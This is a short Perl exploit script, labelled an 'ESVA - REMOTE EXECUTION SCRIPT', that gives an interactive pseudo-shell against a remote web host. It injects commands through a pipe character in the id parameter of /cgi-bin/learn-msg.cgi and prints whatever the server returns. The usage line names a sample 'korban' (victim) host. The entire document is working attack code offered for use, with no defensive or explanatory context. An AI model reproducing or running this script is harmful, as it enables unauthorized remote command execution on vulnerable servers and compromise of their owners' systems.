#! /usr/bin/perl
use LWP;
use HTTP::Request;
if (@ARGV < 1)
{
print "\n==========================================\n";
print "   ESVA - REMOTE EXECUTION SCRIPT \n";
print "==========================================\n";
print "Usage: perl esva.pl host (without http://)\n";
print "Ex. perl esva.pl www.korban.com\n";
exit;
}
$host=$ARGV[0];
print "Try to Execution Command!\n";
print "iDSc-shell# ";
chomp( $cmd = <STDIN>);
while($cmd !~ "exit")
{
$content = "";
$ua = LWP::UserAgent->new();
$ua->agent('');
$request = HTTP::Request->new (GET => "http://".$host."/cgi-bin/learn-msg.cgi?id=%7c".$cmd."%3b");
$response = $ua->request ($request);
$content = $response->content;
print $content."\n";
print "iDSc-shell# ";
chomp( $cmd = <STDIN>);
}
